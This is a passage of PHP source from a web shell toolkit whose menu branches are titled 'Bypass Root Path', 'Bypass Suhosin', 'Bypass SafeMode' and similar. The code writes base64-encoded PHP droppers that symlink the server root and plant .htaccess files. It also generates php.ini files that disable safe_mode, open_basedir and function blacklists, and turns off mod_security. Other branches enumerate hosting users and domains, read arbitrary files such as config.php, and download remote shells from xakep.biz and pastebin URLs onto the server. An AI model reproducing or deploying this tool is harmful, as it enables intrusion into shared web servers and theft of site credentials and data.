                                                                            $bforb = 'PGhlYWQ+PHRpdGxlPkJ5cGFzcyBCeXBhc3MgUm9vdCBQYXRoIGJ5IFZpcnVzYSBXb3JtPC90aXRsZT48L2hlYWQ+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3Lmljb25qLmNvbS9pY28vYy91L2N1MWJtcGdiMWsuaWNvIiB0eXBlPSJpbWFnZS94LWljb24iIC8+PHN0eWxlIHR5cGU9InRleHQvY3NzIj48IS0tIGJvZHkge2JhY2tncm91bmQtY29sb3I6IHRyYW5zcGFyZW50OyBmb250LWZhbWlseTpDb3VyaWVyCW1hcmdpbi1sZWZ0OiAwcHg7IG1hcmdpbi10b3A6IDBweDsgdGV4dC1hbGlnbjogY2VudGVyOyBOZXc7Zm9udC1zaXplOjEycHg7Y29sb3I6IzAwOTkwMDtmb250LXdlaWdodDo0MDA7fSBhe3RleHQtZGVjb3JhdGlvbjpub25lO30gYTpsaW5rIHtjb2xvcjojMDA5OTAwO30gYTp2aXNpdGVkIHtjb2xvcjojMDA3NzAwO30gYTpob3Zlcntjb2xvcjojMDBmZjAwO30gYTphY3RpdmUge2NvbG9yOiMwMDk5MDA7fSAtLT48IS0tIE1hZGUgQnkgVmlydXNhIFdvcm0gLS0+PC9zdHlsZT48YnI+PGJyPjxib2R5IGJnQ29sb3I9IjAwMDAwMCI+PHRyPjx0ZD48P3BocCBlY2hvICI8Zm9ybSBtZXRob2Q9J1BPU1QnIGFjdGlvbj0nJz4iIDsgZWNobyAiPGNlbnRlcj48aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nQnlwYXNzIGl0JyBuYW1lPSd2aXJ1c2EnPjwvY2VudGVyPiI7IGlmIChpc3NldCgkX1BPU1RbJ3ZpcnVzYSddKSl7IHN5c3RlbSgnbG4gLXMgLyB2aXJ1c2EudHh0Jyk7ICRmdmNrZW0gPSdUM0IwYVc5dWN5QkpibVJsZUdWeklFWnZiR3h2ZDFONWJVeHBibXR6RFFwRWFYSmxZM1J2Y25sSmJtUmxlQ0J6YzNOemMzTXVhSFJ0RFFwQlpHUlVlWEJsSUhSNGRDQXVjR2h3RFFwQlpHUklZVzVrYkdWeUlIUjRkQ0F1Y0dodyc7ICRmaWxlID0gZm9wZW4oIi5odGFjY2VzcyIsIncrIik7ICR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJGZ2Y2tlbSkpOyAkdmlydXNhID0gc3ltbGluaygiLyIsInZpcnVzYS50eHQiKTsgJHJ0PSI8YnI+PGEgaHJlZj12aXJ1c2EudHh0IFRBUkdFVD0nX2JsYW5rJz48Zm9udCBjb2xvcj0jMDBiYjAwIHNpemU9MiBmYWNlPSdDb3VyaWVyIE5ldyc+PGI+QnlwYXNzZWQgU3VjY2Vzc2Z1bGx5PC9iPjwvZm9udD48L2E+IjsgZWNobyAiPGJyPjxicj48Yj5Eb25lLi4gITwvYj48YnI+PGJyPkNoZWNrIGxpbmsgZ2l2ZW4gYmVsb3cgZm9yIC8gZm9sZGVyIHN5bWxpbmsgPGJyPiRydDwvY2VudGVyPiI7fSBlY2hvICI8L2Zvcm0+IjsgID8+PC90ZD48L3RyPjwvYm9keT48L2h0bWw+';

                                                                            $file = fopen("bforb.php" ,"w+");
                                                                            $write = fwrite ($file ,base64_decode($bforb));
                                                                            fclose($file);
                                                                            chmod("bforb.php",0755);
                                                                            echo "<iframe src=tools/bforb.php width=60% height=60% frameborder=0></iframe>";
                                                                        }
                                                                        /////////////////////////////////////////////////coeg///// /////////////////////////////
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'rootexecbpass'))
                                                                        {
                                                                            echo '<br><center><span style="font-size:30px; font-family:Tahoma, Geneva, sans-serif; color:#009900">Bypass Root Path With exec Function</span><center><br>';
                                                                            mkdir('tools', 0755);
                                                                            chdir('tools');
                                                                            $excrooooot = 'PGhlYWQ+DQo8dGl0bGU+QnlwYXNzIEJ5cGFzcyBSb290IFBhdGggYnkgTWF1cml0YW5pYSBBdHRhY2tlcjwvdGl0bGU+DQo8L2hlYWQ+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3Lmljb25qLmNvbS9pY28vYy91L2N1MWJtcGdiMWsuaWNvIiB0eXBlPSJpbWFnZS94LWljb24iIC8+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPjwhLS0gYm9keSB7YmFja2dyb3VuZC1jb2xvcjogdHJhbnNwYXJlbnQ7IGZvbnQtZmFtaWx5OkNvdXJpZXIJbWFyZ2luLWxlZnQ6IDBweDsgbWFyZ2luLXRvcDogMHB4OyB0ZXh0LWFsaWduOiBjZW50ZXI7IE5ldztmb250LXNpemU6MTJweDtjb2xvcjojMDA4ODAwO2ZvbnQtd2VpZ2h0OjQwMDt9IGF7dGV4dC1kZWNvcmF0aW9uOm5vbmU7fSBhOmxpbmsge2NvbG9yOiMwMDk5MDA7fSBhOnZpc2l0ZWQge2NvbG9yOiMwMDg4MDA7fSBhOmhvdmVye2NvbG9yOiMwMGJiMDA7fSBhOmFjdGl2ZSB7Y29sb3I6IzAwOTkwMDt9IC0tPjwhLS0gTWFkZSBCeSBNYXVyaXRhbmlhIEF0dGFja2VyIC0tPg0KPC9zdHlsZT48YnI+PGJyPjxib2R5IGJnQ29sb3I9IjAwMDAwMCI+PHRyPjx0ZD48P3BocCBlY2hvICI8Zm9ybSBtZXRob2Q9J1BPU1QnIGFjdGlvbj0nJz4iIDsgDQplY2hvICI8Y2VudGVyPjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdCeXBhc3MgaXQnIG5hbWU9J2V4ZWNlcic+PC9jZW50ZXI+IjsgDQppZiAoaXNzZXQoJF9QT1NUWydleGVjZXInXSkpeyBleGVjKCdsbiAtcyAvIHJvb3QtZXhlYy50eHQnKTsgDQokZnZja2VtID0nVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCemMzTnpjM011YUhSdERRcEJaR1JVZVhCbElIUjRkQ0F1Y0dod0RRcEJaR1JJWVc1a2JHVnlJSFI0ZENBdWNHaHcnOyANCiRmaWxlID0gZm9wZW4oIi5odGFjY2VzcyIsIncrIik7ICR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJGZ2Y2tlbSkpOyAkZXhlY2VyID0gc3ltbGluaygiLyIsInJvb3QtZXhlYy50eHQiKTsgDQokcnQ9Ijxicj48YSBocmVmPXJvb3QtZXhlYy50eHQgVEFSR0VUPSdfYmxhbmsnPjxmb250IGNvbG9yPSMwMGJiMDAgc2l6ZT0yIGZhY2U9J0NvdXJpZXIgTmV3Jz48Yj5CeXBhc3NlZCBTdWNjZXNzZnVsbHk8L2I+PC9mb250PjwvYT4iOyANCmVjaG8gIjxicj48YnI+PGI+RG9uZS4uICE8L2I+PGJyPjxicj5DaGVjayBsaW5rIGdpdmVuIGJlbG93IGZvciAvIGZvbGRlciBzeW1saW5rIDxicj4kcnQ8L2NlbnRlcj4iO30gZWNobyAiPC9mb3JtPiI7ICA/PjwvdGQ+PC90cj48L2JvZHk+PC9odG1sPg==';

                                                                            $file = fopen("excrooooot.php" ,"w+");
                                                                            $write = fwrite ($file ,base64_decode($excrooooot));
                                                                            fclose($file);
                                                                            chmod("excrooooot.php",0755);
                                                                            echo "<iframe src=tools/excrooooot.php width=60% height=60% frameborder=0></iframe>";
                                                                        }
                                                                        /////////////////////////////////////////////////coeg///// /////////////////////////////
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'rootshelleexecbpass'))
                                                                        {

                                                                            echo '<br><center><span style="font-size:30px; font-family:Tahoma, Geneva, sans-serif; color:#009900">Bypass Root Path With shell_exec Function</span><center><br>';
                                                                            mkdir('tools', 0755);
                                                                            chdir('tools');
                                                                            $shellexcexce = 'PGhlYWQ+DQo8dGl0bGU+QnlwYXNzIEJ5cGFzcyBSb290IFBhdGggYnkgTWF1cml0YW5pYSBBdHRhY2tlcjwvdGl0bGU+DQo8L2hlYWQ+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3Lmljb25qLmNvbS9pY28vYy91L2N1MWJtcGdiMWsuaWNvIiB0eXBlPSJpbWFnZS94LWljb24iIC8+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPjwhLS0gYm9keSB7YmFja2dyb3VuZC1jb2xvcjogdHJhbnNwYXJlbnQ7IGZvbnQtZmFtaWx5OkNvdXJpZXIJbWFyZ2luLWxlZnQ6IDBweDsgbWFyZ2luLXRvcDogMHB4OyB0ZXh0LWFsaWduOiBjZW50ZXI7IE5ldztmb250LXNpemU6MTJweDtjb2xvcjojMDA4ODAwO2ZvbnQtd2VpZ2h0OjQwMDt9IGF7dGV4dC1kZWNvcmF0aW9uOm5vbmU7fSBhOmxpbmsge2NvbG9yOiMwMDk5MDA7fSBhOnZpc2l0ZWQge2NvbG9yOiMwMDg4MDA7fSBhOmhvdmVye2NvbG9yOiMwMGJiMDA7fSBhOmFjdGl2ZSB7Y29sb3I6IzAwOTkwMDt9IC0tPjwhLS0gTWFkZSBCeSBNYXVyaXRhbmlhIEF0dGFja2VyIC0tPg0KPC9zdHlsZT48YnI+PGJyPjxib2R5IGJnQ29sb3I9IjAwMDAwMCI+PHRyPjx0ZD48P3BocCBlY2hvICI8Zm9ybSBtZXRob2Q9J1BPU1QnIGFjdGlvbj0nJz4iIDsgDQplY2hvICI8Y2VudGVyPjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdCeXBhc3MgaXQnIG5hbWU9J3NoZWxsX2V4ZWNlcic+PC9jZW50ZXI+IjsgDQppZiAoaXNzZXQoJF9QT1NUWydzaGVsbF9leGVjZXInXSkpeyBzaGVsbF9leGVjKCdsbiAtcyAvIHJvb3Qtc2hlbGxfZXhlYy50eHQnKTsgDQokZnZja2VtID0nVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCemMzTnpjM011YUhSdERRcEJaR1JVZVhCbElIUjRkQ0F1Y0dod0RRcEJaR1JJWVc1a2JHVnlJSFI0ZENBdWNHaHcnOyANCiRmaWxlID0gZm9wZW4oIi5odGFjY2VzcyIsIncrIik7ICR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJGZ2Y2tlbSkpOyAkc2hlbGxfZXhlY2VyID0gc3ltbGluaygiLyIsInJvb3Qtc2hlbGxfZXhlYy50eHQiKTsgDQokcnQ9Ijxicj48YSBocmVmPXJvb3Qtc2hlbGxfZXhlYy50eHQgVEFSR0VUPSdfYmxhbmsnPjxmb250IGNvbG9yPSMwMGJiMDAgc2l6ZT0yIGZhY2U9J0NvdXJpZXIgTmV3Jz48Yj5CeXBhc3NlZCBTdWNjZXNzZnVsbHk8L2I+PC9mb250PjwvYT4iOyANCmVjaG8gIjxicj48YnI+PGI+RG9uZS4uICE8L2I+PGJyPjxicj5DaGVjayBsaW5rIGdpdmVuIGJlbG93IGZvciAvIGZvbGRlciBzeW1saW5rIDxicj4kcnQ8L2NlbnRlcj4iO30gZWNobyAiPC9mb3JtPiI7ICA/PjwvdGQ+PC90cj48L2JvZHk+PC9odG1sPg==';

                                                                            $file = fopen("shellexcexce.php" ,"w+");
                                                                            $write = fwrite ($file ,base64_decode($shellexcexce));
                                                                            fclose($file);
                                                                            chmod("shellexcexce.php",0755);
                                                                            echo "<iframe src=tools/shellexcexce.php width=60% height=60% frameborder=0></iframe>";
                                                                        }
                                                                        /////////////////////////////////////////////////coeg///// /////////////////////////////
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'posget'))
                                                                        {echo '<br><center><span style="font-size:30px; font-family:Tahoma, Geneva, sans-serif; color:#009900">Bypass posix_getpwuid</span><center><br>';
                                                                            echo '<form method="POST">
<input class="inputz" size="20" value="0" name="min" type="text">
<font face="Tahoma" color="#007700" size="2pt"> to </font>
<input class="inputz" size="20" value="1024" name="max" type="text"> <input class="inputzbut" value="Symlink" name="" type="submit">
</form><br>';
                                                                            if($_POST){
                                                                                $min = $_POST['min'];
                                                                                $max = $_POST['max'];
                                                                                echo"<div class='tmp'><table align='center' width='40%'><td><font color='#e4e4e4'><b>Domains</b></font></td><td><font color='#e4e4e4'><b>Users</b></font></td><td><font color='#e4e4e4'><b>Symlink</b> </font></td>";

                                                                                $p = 0;
                                                                                error_reporting(0);
                                                                                $list = scandir("/var/named");
                                                                                for($p = $min; $min <= $max; $p++)
                                                                                {
                                                                                    $user = posix_getpwuid($p);
                                                                                    if(is_array($user)){

                                                                                        foreach($list as $domain){
                                                                                            if(strpos($domain,".db")){
                                                                                                $domain = str_replace('.db','',$domain);
                                                                                                $owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
                                                                                                if($owner['name'] == $user['name'])
                                                                                                {
                                                                                                    $i += 1;
                                                                                                    $cheechee = checkAlexa($domain);
                                                                                                    echo "<tr><td class='cone'><a href='http://".$domain." '>".$domain."</a> <font color='#00bb00'>- </font><font color='#e4e4e4'>".$cheechee."</font></td><center><td class='cone'><font color='#00bb00'>".$user['name']."</font></center></td><td class='cone'><center><a href='sim/rut".$owner['dir']."/public_html/' target='_blank'>Dir</a></center></td>";
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                                echo "<center><font face='Tahoma' color='#00bb00' size='2pt'>Total Domains Found:</font><font face='Tahoma' color='#00bb00' size='2pt'> ".$i."</font></center><br />";
                                                                            }
                                                                            echo "</table></div><br><br>";
                                                                        }
                                                                        /////////////////////////////////////////////////coeg///// /////////////////////////////
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'suphp'))
                                                                        {echo '<br><center><span style="font-size:30px; font-family:Tahoma, Geneva, sans-serif; color:#009900">Bypass PHP Suhosin Function Blacklist</span><center><br>';
                                                                            echo "<br><form method='POST'>
<input class='inputz' type='text' name='path' size='25' value=".dirname(__FILE__)." '>
<input  class='inputz' type='text' name='shell' size='25' value='http://files.xakep.biz/shells/PHP/wso.txt'>
<input  class='inputz' type='submit' value='Bypass' name='start'><br><br>";
                                                                            echo "<textarea class='inputz' rows='15' cols='78'>virusa worm Mode :) \n";
                                                                            if($_POST['start']) {
                                                                                $path = $_POST['path'];
                                                                                $file = $_POST['shell'];
                                                                                $htaccess = "suPHP_ConfigPath $path/vworm/php.ini";
                                                                                $phpini = "c2FmZV9tb2RlID0gT0ZGCnN1aG9zaW4uZXhlY3V0b3IuZnVuYy5ibGFja2xpc3QgPSBOT05FCmRpc2FibGVfZnVuY3Rpb25zID0gTk9ORQ==";
                                                                                $dir = "vworm";
                                                                                if(file_exists($dir)) {
                                                                                    echo "[+] vworm Folder There Before :)\n";
                                                                                } else {
                                                                                    @mkdir($dir); {
                                                                                        echo "[+] vworm Folder Created :D\n";
                                                                                    } }
#Generate Sh3LL
                                                                                $fopen = fopen("vworm/vw.php",'w');
                                                                                $shell = @file_get_contents($file);
                                                                                $swrite = fwrite($fopen ,$shell);
                                                                                if($swrite){
                                                                                    echo "[+] Shell Has Been Generated Name : vw.php \n";
                                                                                } else {
                                                                                    echo "[~] Can't Generate Shell\n";
                                                                                }
                                                                                fclose($fopen);
#Generate Htaccess
                                                                                $hopen = fopen("vworm/.htaccess", "w");
                                                                                $hwrite = fwrite($hopen, $htaccess);
                                                                                if($hwrite){
                                                                                    echo "[+] htaccess Generated\n";
                                                                                } else {
                                                                                    echo "[~] Can't Generate htaccess\n";
                                                                                }
                                                                                fclose($hopen);
                                                                                $ini = fopen("vworm/php.ini" ,"w");
                                                                                $php = fwrite($ini, base64_decode($phpini));
                                                                                if($php){
                                                                                    echo "[+] PHP.INI Generated";
                                                                                } else {
                                                                                    echo "[-] Can't Generate PHP.INI";
                                                                                }
                                                                            }
                                                                            echo "</textarea><br><br><br>";
                                                                        }
                                                                        /////////////////////////////////////////////////coeg///// /////////////////////////////
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'suppet'))
                                                                        {
                                                                            echo '<br><center><span style="font-size:30px; font-family:Tahoma, Geneva, sans-serif; color:#009900">Bypass Functions suPHP_ConfigPath Security</span><center><br>';
                                                                            echo '<center><form method=post><br><br>
<input class="inputzbut" type=submit name=gnr value="Generate htaccess" /></form></center>';

                                                                            error_reporting(0);

                                                                            if(isset($_POST['gnr']))
                                                                            {
                                                                                mkdir('suPHP2',0755);
                                                                                $rr  = "<IfModule mod_security.c> 
SecFilterEngine Off 
SecFilterScanPOST Off 
SecFilterCheckURLEncoding Off 
SecFilterCheckCookieFormat Off 
SecFilterCheckUnicodeEncoding Off 
SecFilterNormalizeCookies Off 
</IfModule> 
<Limit GET POST> 
order deny,allow 
deny from all 
allow from all 
</Limit> 
<Limit PUT DELETE> 
order deny,allow 
deny from all 
</Limit> 
suPHP_ConfigPath ".getcwd()."/php.ini";
                                                                                $g = fopen('suPHP2/.htaccess','w');
                                                                                fwrite($g,$rr);
                                                                                echo "<br><br><font color=red size=2 face=\"Courier New\">.htaccess Has Been Generated Successfully</font></center><br><br>";
                                                                                echo "<center><br><b class='cone'><a href=suPHP2/ target='_blank'><font face='Tahoma' color='#00bb00' size='2pt'>Click here </font></a></b></center><br>";
                                                                            }
                                                                            echo '<center><form method=post><br><br>
<input class="inputzbut"  type=submit name=gnrp value="Generate php.ini" /></form></center>';
                                                                            error_reporting(0);

                                                                            if(isset($_POST['gnrp']))
                                                                            {
                                                                                mkdir('suPHP2',0755);
                                                                                $rr  = "safe_mode = Off
disable_functions = NONE
safe_mode_gid = OFF
open_basedir = OFF";
                                                                                $g = fopen('suPHP2/php.ini','w');
                                                                                fwrite($g,$rr);
                                                                                echo "<br><br><font color=red size=2 face=\"Courier New\">php.ini Has Been Generated Successfully</font></center><br><br>";
                                                                                echo "<center><br><b class='cone'><a href=suPHP2/ target='_blank'><font face='Tahoma' color='#00bb00' size='2pt'>Click here </font></a></b></center><br>";

                                                                            }
                                                                        }
                                                                        /////////////////////////////////////////////////coeg///// /////////////////////////////
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'setphr'))
                                                                        {echo '<br><center><span style="font-size:30px; font-family:Tahoma, Geneva, sans-serif; color:#009900">Bypass suPHP Security</span><center><br>';
                                                                            echo '<center><form method=post><br><br>
<input class="inputzbut"  type=submit name=gnr value="Generate htaccess" /></form></center>';

                                                                            error_reporting(0);

                                                                            if(isset($_POST['gnr']))
                                                                            {
                                                                                mkdir('suPHP',0755);
                                                                                $rr  = "<IfModule mod_security.c> 
SecFilterEngine Off 
SecFilterScanPOST Off 
SecFilterCheckURLEncoding Off 
SecFilterCheckCookieFormat Off 
SecFilterCheckUnicodeEncoding Off 
SecFilterNormalizeCookies Off 
</IfModule> 
<Limit GET POST> 
order deny,allow 
deny from all 
allow from all 
</Limit> 
<Limit PUT DELETE> 
order deny,allow 
deny from all 
</Limit> 
suPHP_ConfigPath ".getcwd()."/php.ini";
                                                                                $g = fopen('suPHP/.htaccess','w');
                                                                                fwrite($g,$rr);
                                                                                echo "<br><br><font color=red size=2 face=\"Courier New\">.htaccess Has Been Generated Successfully</font></center><br><br>";
                                                                                echo "<center><br><b class='cone'><a href=suPHP/ target='_blank'><font face='Tahoma' color='#00bb00' size='2pt'>Click here </font></a></b></center><br>";
                                                                            }
                                                                            echo '<center><form method=post><br><br>
<input class="inputzbut"  type=submit name=gnrp value="Generate php.ini" /></form></center>';
                                                                            error_reporting(0);

                                                                            if(isset($_POST['gnrp']))
                                                                            {
                                                                                mkdir('suPHP',0755);
                                                                                $rr  = "safe_mode = OFF
Safe_mode_gid = OFF
disable_functions = NONE
disable_classes = NONE
open_basedir = OFF
suhosin.executor.func.blacklist = NONE";
                                                                                $g = fopen('suPHP/php.ini','w');
                                                                                fwrite($g,$rr);
                                                                                echo "<br><br><font color=red size=2 face=\"Courier New\">php.ini Has Been Generated Successfully</font></center><br><br>";
                                                                                echo "<center><br><b class='cone'><a href=suPHP/ target='_blank'><font face='Tahoma' color='#00bb00' size='2pt'>Click here </font></a></b></center><br>";

                                                                            }
                                                                        }
                                                                        /////////////////////////////////////////////////coeg///// /////////////////////////////
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'simpelb'))
                                                                        {
                                                                            echo '<br><center><span style="font-size:30px; font-family:Tahoma, Geneva, sans-serif; color:#009900">Simple Bypasser</span><center><br>';
                                                                            echo '<br><font face="Tahoma" color="#007700" size="2pt">Create Folder : </font>
<input class="inputzbut"   type="text" name="dir" size="43" value="worm"> 
<input class="inputzbut"   type="submit" value="Create" name="folder"> <br> <br>
<font face="Tahoma" color="#007700" size="2pt">Get File : </font><br>
<input class="inputzbut"   type="text" name="get" size="16" value="url file .txt"> 
<input class="inputzbut"   type="text" name="name" size="15" value="worm.php">
<input  class="inputzbut"  type="text" name="select" size="16" value='.dirname(__FILE__).'>
<input class="inputzbut"   type="submit" value="GET" name="fileget"> <br> <br>
<font face="Tahoma" color="#007700" size="2pt">Fopen File : </font><br>
<input class="inputzbut"   type="text" name="save" size="29" value="vwo.php">
<input class="inputzbut"   type="text" name="path2" size="29" value='.dirname(__FILE__).'><br><br>
<textarea  class="inputzbut" name="source" cols="78" rows="15">PHP Code</textarea><br><br>
<input class="inputzbut"  type="submit" value="Save" name="fopen"> <br><br><br>';
                                                                            if($_POST['folder']) {
                                                                                $mk = $_POST['dir'];
                                                                                $func = "bWtkaXI=";
                                                                                $de = base64_decode($func);
                                                                                $rules1 = $de($mk);
                                                                                if ($mk) {
                                                                                    echo "<br><b class='cone'>[+] Done [ $mk ] Created !</b>";
                                                                                } }
# File Get Contents
                                                                            if($_POST['fileget']) {
                                                                                $get = $_POST['get'];
                                                                                $n4m = $_POST['name'];
                                                                                $path = $_POST['select'];
                                                                                $func2 = "ZmlsZV9nZXRfY29udGVudHM=";
                                                                                $de2 = base64_decode($func2);
                                                                                $rules2 = $de2($get);
                                                                                $open = fopen("$path/$n4m", 'w');
                                                                                fwrite($open,$rules2);
                                                                                fclose($open);
                                                                                if($get) {
                                                                                    echo "done";
                                                                                } }
#
# fopen File
                                                                            if($_POST['fopen']) {
                                                                                $save = $_POST['save'];
                                                                                $path2 = $_POST['path2'];
                                                                                $open2 = fopen("$path2/$save", 'w');
                                                                                $source1 = $_POST['source'];
                                                                                $source2 = stripslashes($source1);
                                                                                fwrite($open2 ,$source2);
                                                                                fclose($open2);
                                                                                if($open2) {
                                                                                    echo "<b class='tmp'>Done</b> <br><br><br>";
                                                                                } }
                                                                        }
                                                                        /////////////////////////////////////////////////coeg///// /////////////////////////////
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'ritf'))
                                                                        {
                                                                            echo '<br><center><span style="font-size:30px; font-family:Tahoma, Geneva, sans-serif; color:#009900">Bypass Read File</span><center><br>';
                                                                            echo "<form method='POST' /> 
<select class='inputzbut' name='website'>
<option value='show_source'>show_source</option>
<option value='highlight_file'>highlight_file</option>
<option value='readfile'>readfile</option>
<option value='include'>include</option>
<option value='require'>require</option>
<option value='file'>file</option>
<option value='fread'>fread</option>
<option value='file_get_contents'>file_get_contents</option>
<option value='fgets'>fgets</option> 
<input class='inputzbut'  type='text' name='file' size='22' /><input  class='inputzbut'  type='submit' name='start'   value='Read Now' />
</select>";

                                                                            function readfils($file) {

                                                                                $web = $_POST['website'];

                                                                                switch ($web)
                                                                                {
                                                                                    case 'show_source': $show =  @show_source($file);  break;

                                                                                    case 'highlight_file': $highlight = @highlight_file($file); break;

                                                                                    case 'readfile': $readfile = @readfile($file);  break;

                                                                                    case 'include': $include = @include($file); break;

                                                                                    case 'require': $require = @require($file);  break;

                                                                                    case 'file': $file =  @file($file);  foreach ($file as $key => $value) {  print $value; }  break;

                                                                                    case 'fread': $fopen = @fopen($file,"r") or die("Unable to open file!"); $fread = @fread($fopen,90000); fclose($fopen); print_r($fread); break;

                                                                                    case 'file_get_contents': $file_get_contents =  @file_get_contents($file); print_r($file_get_contents);  break;

                                                                                    case 'fgets': $fgets = @fopen($file,"r") or die("Unable to open file!"); while(!feof($fgets)) { echo fgets($fgets); } fclose($fgets); break;

                                                                                    default:
                                                                                        echo "{$web} Not There";
                                                                                }
                                                                            }

                                                                            echo "<br><br><textarea class='inputzbut' rows='15' cols='68' />";
                                                                            $file = trim($_POST['file']);
                                                                            if($_POST['start'])
                                                                            {
                                                                                readfils($file); }
                                                                            echo "</textarea><br><br><br><br>";
                                                                        }
                                                                        /////////////////////////////////////////////////coeg///// /////////////////////////////
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'baidir'))
                                                                        {echo '<br><center><span style="font-size:30px; font-family:Tahoma, Geneva, sans-serif; color:#009900">Bypass Chmod Directory Priv8</span><center><br><br>';
                                                                            echo '<form action="" method="post">
<p>
<center>
<input class="inputzbut" type="text" name="file" placeholder="/home/user/public_html/directory">
<input class="inputzbut" type="submit" name="bypass" value="Bypass Chmod Dir">
</form></center></p><br><br><br>';

                                                                            if($_POST)
                                                                            {
                                                                                $mauritania = $_POST['file'];
                                                                                $ch = @chmod($mauritania,'0311');
                                                                                if($ch)
                                                                                {
                                                                                    echo "[+] Directory  <font face='Tahoma' size='3' color='#b0b000'> =>{$mauritania}               => [+] Permission Changed Successfully Bypassed ^_^ [+]";
                                                                                }
                                                                                else
                                                                                {
                                                                                    echo "[-] Directory  <font face='Tahoma' size='3' color='red'> =>{$mauritania}                 => [-] Permission can't be changed , maybe chmod function is disabled :( [-]";
                                                                                }
                                                                            }
                                                                        }
                                                                        /////////////////////////////////////////////////coeg///// /////////////////////////////
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'forb14'))
                                                                        {
                                                                            echo '<br><center><span style="font-size:30px; font-family:Tahoma, Geneva, sans-serif; color:#009900">Bypass Forbidden 2014</span><center><br><br>';
                                                                            $fp = fopen("php.ini","w+");
                                                                            fwrite($fp,"safe_mode = OFF
Safe_mode_gid = OFF
disable_functions = NONE
disable_classes = NONE
open_basedir = OFF
suhosin.executor.func.blacklist = NONE ");
                                                                            echo'
<form method="post">
<input class="inputzbut" type="text" name="file" value="/home/user/public_html/config.php" size="60"/><br /><br />
<input class="inputzbut"  type="text" name="ghostfile" value="config.txt" size="60"/><br /><br />
<input  class="inputzbut" type="submit" value="Bypass" name="symlink" /> <br /><br />
</form>
';
                                                                            echo '<div class="tul"><b>PHP VERSION:</b> <font color="white" face="shell, Geneva, sans-serif" style="font-size: 8pt">';echo phpversion();
                                                                            echo '<br><br><br>';

                                                                            $fichier = $_POST['file'];
                                                                            $ghostfile = $_POST['ghostfile'];
                                                                            $symlink = $_POST['symlink'];

                                                                            if ($symlink)
                                                                            {


                                                                                $dir = "mauritania";
                                                                                if(file_exists($dir)) {
                                                                                    echo "<br><font color='red'>[+] mauritania Folder Already Exist _ are you Drunk XD !!!</font><br />";
                                                                                } else {
                                                                                    @mkdir($dir); {
                                                                                        echo '<br><b class="cont" align="center"><b class="font-effect-fire-animation" style=font-family:Ubuntu;font-size:12px;color:white;>\!/ mauritania Folder Created ^_^ \!/  </b></b>';
                                                                                        echo '<br><b class="cont" align="center"><b class="font-effect-fire-animation" style=font-family:Ubuntu;font-size:12px;color:white;>File Retrieved Successfully</b></b>';

                                                                                    } }


                                                                                $priv9  = "#Priv9 htaccess By Mauritania Attacker
OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
Options Indexes FollowSymLinks
DirectoryIndex $ghostfile
ForceType text/plain
AddType text/plain .php 
AddType text/plain .html
AddType text/html .shtml
AddType txt .php
AddHandler server-parsed .php
AddHandler txt .php
AddHandler txt .html
AddHandler txt .shtml
Options All
SetEnv PHPRC ".dirname(__FILE__)."/mauritania/php.ini
suPHP_ConfigPath ".dirname(__FILE__)."/mauritania/php.ini
";
                                                                                $f =@fopen ('mauritania/.htaccess','w');
                                                                                @fwrite($f , $priv9);

                                                                                @symlink("$fichier","mauritania/$ghostfile");

                                                                                echo '<br /><a target="_blank" href="mauritania/" ><font color="white" size"12">'.$ghostfile.'</a></font>';
                                                                            }
                                                                        }
                                                                        /////////////////////////////////////////////////coeg///// /////////////////////////////
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'smod14'))
                                                                        {echo '<br><center><span style="font-size:30px; font-family:Tahoma, Geneva, sans-serif; color:#009900">Bypass SafeMode 2014 Priv8</span><center><br><br>';
                                                                            echo "<br><form method='POST'>
<center><font color='#007700' size='2' face='shell'>Cwd&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font><input class='inputzbut' type='text' size='40' name='zero' value=".dirname(__FILE__)." &lt;font color='#b0b000' size='8' face='Tahoma'></font></center>
<center><font color='#007700' size='2' face='shell'>Shell&nbsp;&nbsp;&nbsp;&nbsp;</font><input class='inputzbut' type='text' size='40' name='shell' value='http://pastebin.com/raw.php?i=2gmt5XFH' &lt;font color='#b0b000' size='8' face='Tahoma'></font></center>
<center><font color='#007700' size='2' face='shell'>ini.php&nbsp;</font><input class='inputzbut'  type='text' size='40' name='rim' value='http://pastebin.com/raw.php?i=sEbXwVvt' &lt;font color='#b0b000' size='8' face='Tahoma'></font></center><br>
<center><input class='inputzbut'  type='submit' value='Bypass SafeMode' name='start' ><br></font></center><br>";
                                                                            echo "<center><textarea  class='inputzbut'  rows='12' cols='60'>Results Will Appear Here ^_^ 
";
                                                                            if($_POST['start']) {
                                                                                $zero = $_POST['zero'];
                                                                                $file = $_POST['shell'];
                                                                                $mauritania = $_POST['rim'];
